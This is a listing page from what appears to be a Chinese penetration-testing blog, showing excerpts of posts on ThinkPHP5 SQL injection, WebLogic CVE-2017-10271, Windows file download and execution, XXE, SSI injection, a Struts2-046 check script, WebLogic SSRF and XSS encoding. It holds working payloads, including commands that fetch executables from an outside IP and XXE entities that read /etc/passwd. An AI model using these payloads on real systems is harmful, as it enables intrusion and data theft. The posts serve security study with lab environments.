
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pentest - Reber's Blog</title>
    <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
    <meta name="author" content="reber">
    <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
    <!--[if lte IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-old-ie-min.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" type="text/css" href="/css/grids-responsive-min.css">
    <!--<![endif]-->
    <link rel="stylesheet" type="text/css" href="/css/style.css">
    <link rel="stylesheet" type="text/css" href="/css/font-awesome.min.css">
    <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
    <link rel="alternate" type="application/rss+xml" title="Reber&#39;s Blog" href="/index.xml" />
    <link rel="stylesheet" href="/css/monokai-sublime.css" type="text/css">
    <script src="/js/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <script src="/js/jquery.min.js"></script>
</head>
<body>



<div class="reber">
    
<div class="head">
    <h1 class="logo" id="logo">
        <a href="/"><img src='/img/logo.png' width='70px'></a>
    </h1>
    <ul class="nav">
        
            
                <li>
                    <a href="/"><i class='fa fa-home fa-fw'></i>Home</a>
            
                </li>
        
            
                <li>
                    <a href="/posts/"><i class='fa fa-list fa-fw'></i>Archive</a>
            
                </li>
        
            
                <li>
                    <a href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
            
                </li>
        
    </ul>
</div>

    
    <div class="main">
        <div class="left">
            
            <div class="content">
                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/thinkphp5-where-function/">ThinkPHP5的where函数</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-04-16
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/php">PHP</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">代码审计</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db('msg'); $id = input('param.id',1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&gt;where(&quot;id=&quot;.$id)-&gt;select(); // $result = $msg-&gt;where(['id'=&gt;$id])-&gt;select(); echo '&lt;br/&gt;&lt;hr/&gt;执行的sql语句：'; echo $msg-&gt;getLastSql(); echo '&lt;br/&gt;最终得到的结果：'; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，当payload为: ) and 1=1 and (1)=(1时判断返回如下： 主要调用文件及函数顺序如下：
    </p>

    
    <footer>
        <a href="/posts/2018/thinkphp5-where-function/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/cve-2017-10271/">WebLogic 反序列化漏洞(CVE-2017-10271)</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-03-09
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/rce">rce</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/deserialize">deserialize</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 WebLogic WLS组件反序列化漏洞 这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下
漏洞环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271
0x01 访问远程文件 POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: 127.0.0.1:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: JSESSIONID=DJbghZRGlJf0PyyLc52n4GdvrbDkrxKWGDpwnncFpHnqsDjMT68F!-298356074 Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 688 Content-Type: text/xml &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object id=&quot;url&quot; class=&quot;java.net.URL&quot;&gt; &lt;string&gt;http://114.115.123.123:80/aaaaaaa&lt;/string&gt; &lt;/object&gt; &lt;object idref=&quot;url&quot;&gt; &lt;void id=&quot;stream&quot; method = &quot;openStream&quot; /&gt; &lt;/object&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt;  0x02 写入文件 POST /wls-wsat/CoordinatorPortType HTTP/1.
    </p>

    
    <footer>
        <a href="/posts/2018/cve-2017-10271/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/msf-simple-elevate-privileges/">Metasploit简单提权</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-02-26
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/tools">tools</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 前提 虚拟机有一个shell：http://10.11.11.20/a.php，物理机IP是211.222.222.72
外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195
0x01 查看主机基本信息 菜刀连接shell，终端执行systeminfo
C:\Apps\phpStudy\WWW\&gt; systeminfo 主机名: REBER-WIN7 OS 名称: Microsoft Windows 7 专业版 OS 版本: 6.1.7600 ��ȱ Build 7600 OS 制造商: Microsoft Corporation OS 配置: 独立服务器 OS 构件类型: Multiprocessor Free 注册的所有人: reber 注册的组织: 产品 ID: 00371-868-0000007-85272 初始安装日期: 2017/12/26, 7:23:00 系统启动时间: 2018/2/26, 9:52:14 系统制造商: Parallels Software International Inc. 系统型号: Parallels Virtual Platform 系统类型: x64-based PC 处理器: 安装了 1 个处理器。 [01]: Intel64 Family 6 Model 70 Stepping 1 GenuineIntel ~2495 Mhz BIOS 版本: Parallels Software International Inc.
    </p>

    
    <footer>
        <a href="/posts/2018/msf-simple-elevate-privileges/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/">Windows终端下载文件和执行远程文件</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2018-02-06
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/intranet">intranet</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        环境：Windows Server 2008 R2 Enterprise
0x00 bitsadmin下载文件 bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:\Windows\Temp\a.exe bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:\Windows\Temp\a.zip bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:\Windows\Temp\a.exe  0x01 certutil下载文件 保存在当前目录
certutil -urlcache -split -f http://114.115.123.123/a.exe a.exe  有时会下载二进制文件的base64编码后的字符串，然后再解码
本地：certutil -encode cc.exe base64.txt 目标：certutil -urlcache -split -f http://114.115.123.123/base64.txt 目标：certutil -decode base64.txt cc.exe  文件会以二进制形式缓存到目录：C:\Users\Administrator\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
certutil -urlcache -f http://114.115.123.123/a.exe  0x02 powershell下载文件 有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
C:&gt;powershell set-executionpolicy unrestricted
powershell (new-object System.Net.WebClient).DownloadFile(&quot;http://114.115.123.123/a.exe&quot;,&quot;C:\Windows\Temp\a.exe&quot;) #-w hidden 下载后终端自动退出 powershell -w hidden -c (new-object System.
    </p>

    
    <footer>
        <a href="/posts/2018/win-terminal-download-and-exec-remote-file/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2017/xxe/">XXE漏洞</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2017-12-09
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xml">xml</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 XXE XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
0x01 示例代码 实验环境：https://github.com/vulhub/vulhub/tree/master/php/php_xxe
simplexml_load_string.php
&lt;?php $data = file_get_contents('php://input'); $xml = simplexml_load_string($data); echo $xml-&gt;name;  0x02 判断是否有xxe漏洞 0x03 读取文件  外部引用读取passwd  &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt;  &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt;   外部引用dtd文件读取passwd  evil.dtd中的内容为：&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
    </p>

    
    <footer>
        <a href="/posts/2017/xxe/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2017/dns-zone-transfer/">DNS域传送漏洞</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2017-11-20
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">敏感信息泄露</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         0x00 DNS域传送 DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。
若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。
0x01 通过nslookup查看域传送漏洞 分为3步：1. 设置type为ns；2. 查询ns服务器；3. 设置ns服务器 0x02 通过dig查看域传送漏洞 0x03 通过nmap查看域传送漏洞 
    </p>

    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2017/ssi-injection/">SSI注入</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2017-06-08
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/injection">injection</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
         0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
0x01 payload &quot;--&gt;'--&gt;`--&gt;&lt;!--#set var=&quot;a&quot; value=&quot;123&quot;--&gt;&lt;!--#set var=&quot;b&quot; value=&quot;654&quot;--&gt;&lt;!--#echo var=&quot;a&quot;--&gt;&lt;!--#echo var=&quot;b&quot;--&gt; &lt;!--#echo var=&quot;DATE_LOCAL&quot; --&gt; &lt;!--#exec cmd=&quot;dir&quot; --&gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  
    </p>

    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2017/struts2-046/">Struts2-046 EXP</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2017-04-16
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/rce">rce</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        Struts2 046 前段时间写的struts2 046检测脚本，代码如下：
#!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber import sys import pycurl import StringIO def initCurl(): c = pycurl.Curl() c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源 c.setopt(pycurl.MAXREDIRS, 5) # c.setopt(pycurl.PROXY,'http://127.0.0.1:1080') return c def check(curl, url): head = [ 'Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150' ] data = '''-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&quot;foo&quot;; filename=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo dd996b71024fa97cd015f06a7f24ed30').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&quot;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n''' buf = StringIO.StringIO() curl.setopt(pycurl.WRITEFUNCTION, buf.write) curl.setopt(pycurl.POSTFIELDS, data) curl.setopt(pycurl.URL, url) # curl.setopt(pycurl.TIMEOUT, 10) curl.setopt(pycurl.HTTPHEADER, head) curl.
    </p>

    
    <footer>
        <a href="/posts/2017/struts2-046/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2017/weblogic-ssrf-check/">检测WebLogic是否存在SSRF</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2017-04-14
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/python">Python</a>&nbsp;&#47;
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/ssrf">ssrf</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 weblogic返回状态 weblogic的ssrf漏洞测试3种状态，返回如下：
 同网段不存在的主机  同网段主机存活但端口不开放  同网段主机存活且端口开放   0x01 检测脚本如下 #!/usr/bin/env python # -*- coding: utf-8 -*- import re import sys import Queue import requests import threading from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) queue = Queue.Queue() mutex = threading.Lock() class Weblogic_SSRF_Check(threading.Thread): &quot;&quot;&quot;docstring for Weblogic_SSRF_Check&quot;&quot;&quot; def __init__(self, queue): threading.Thread.__init__(self) self.queue = queue def check(self,domain,ip): payload = &quot;uddiexplorer/SearchPublicRegistries.jsp?operator={ip}&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot;.format(ip=ip) url = domain + payload try: html = requests.get(url=url, timeout=15, verify=False).content m = re.
    </p>

    
    <footer>
        <a href="/posts/2017/weblogic-ssrf-check/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                
                    
<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
<article>
    <header>
        <h2><a href="https://wyb0.com/posts/2017/xss-encode/">XSS中的编码</a></h2>

        
        <div class="post-meta">
            <div style="padding:5px 5px 2px 5px;">
                <i class="fa fa-calendar fa-fw"></i>
                <time>
                    2017-03-30
                </time>
                &nbsp;&nbsp;&nbsp;&nbsp;
            

                

            
                
                
                
                    <i class="fa fa-folder fa-fw"></i>
                    
                        <a class="post-taxonomy-topic" href="https://wyb0.com/topics/pentest">Pentest</a>
                    
                
                
                &nbsp;&nbsp;&nbsp;&nbsp;
                
                
                
                    <i class="fa fa-tags fa-fw"></i>
                    
                        <a class="post-taxonomy-tag" href="https://wyb0.com/tags/xss">xss</a>
                    
                
                
            </div>
        </div>
    </header>

    
    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
        0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&lt;script&gt;&lt;/script&gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
%+字符的ASCII编码对应的两位十六进制，如&quot;/&quot;的url编码为&quot;%2F&quot;  HTML编码
 实体编码
&amp;开头分号结尾，如 &quot;&lt;&quot; 的编码是 &quot;&amp;lt;&quot;  字符编码
样式为&quot;&amp;#数值;&quot;，数值可为10进制、16进制ASCII编码或unicode字符编码 如&quot;&lt;&quot;可编码为&quot;&amp;#060;&quot;和&quot;&amp;#x3c;&quot;，但是必须在属性值里面   JS编码
1、两个十六进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\x3c&quot; 2、三个八进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\074&quot; 3、四个十六进制数字，如果不够个数，前面补0，例如&quot;&lt;&quot;编码为&quot;\u003c&quot; 4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）  CSS编码
反斜线(\)后跟1~6位的16进制数字，如&quot;e&quot;为&quot;\65&quot;或&quot;65&quot;或&quot;00065&quot;   0x02 编码与解码顺序 解码时先解码最外层，编码时先编码最内层
如&lt;td onclick=&quot;openUrl(add.do?userName='{$value}');&quot;&gt;11&lt;/td&gt;， 首先value出现在url中，而url在js中，而js又是html一部分，所以 解码顺序为：html解码-&gt;js解码-&gt;url解码 编码顺序为：url编码-&gt;js编码-&gt;html编码  0x03 利用  八进制
&lt;p id=&quot;test&quot;&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var test = &quot;\74\151\155\147\40\163\162\143\75\170\40\157\156\145\162\162\157\162\75\141\154\145\162\164\50\61\51\76&quot;; var p = document.getElementById('test'); #这里会进行js解码 p.innerHTML = test; &lt;/script&gt;  十进制和十六进制
&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt; &lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;  javascript协议
    </p>

    
    <footer>
        <a href="/posts/2017/xss-encode/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
    </footer>
    
</article>


                

                


    
    
    <nav class="pagination" role="pagination">
        
            <a href="/topics/pentest/page/2/"><i class="fa fa-chevron-left"></i></a>
        

        <span>&nbsp;3 / 9&nbsp;</span>
        
        
            <a href="/topics/pentest/page/4/"><i class="fa fa-chevron-right"></i></a>
        
    </nav>


            </div>
        </div>
        <div class="right">
            

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Categorie<a href="/single/index.html" class="single" target="_blank">s</a></h2>
    <ul style="margin-left:10px;margin-bottom:0px;left:10px;">
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/database" title="database">database(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/git" title="git">git(4)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/javascript" title="javascript">javascript(4)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/linux" title="linux">linux(25)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/other" title="other">other(14)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/pentest" title="pentest">pentest(82)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/php" title="php">php(12)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/python" title="python">python(28)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/server" title="server">server(10)</a>
            </li>
        
            <li style="list-style-type:none;">
                <i class="fa fa-folder fa-fw"></i>
                <a href="https://wyb0.com/topics/windows" title="windows">windows(2)</a>
            </li>
        
    </ul>


</div>
            

<div style="padding-bottom:10px;">


    <h2 class="asidetitle">Tags</h2>
    <div class="taglist" id="tags">
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/ajax" title="ajax">ajax</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/backdoor" title="backdoor">backdoor</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/cgi" title="cgi">cgi</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/csrf" title="csrf">csrf</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/c%e8%af%ad%e8%a8%80" title="c语言">c语言</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/dedecms" title="dedecms">dedecms</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/des" title="des">des</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/deserialize" title="deserialize">deserialize</a>
                <sup>4</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/dmz" title="dmz">dmz</a>
                <sup>1</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/docker" title="docker">docker</a>
                <sup>6</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/fileupload" title="fileupload">fileupload</a>
                <sup>3</sup>
            </p>
        
            <p style="display:inline-block;">
                <a href="https://wyb0.com/tags/getshell" title="getshell">getshell</a>
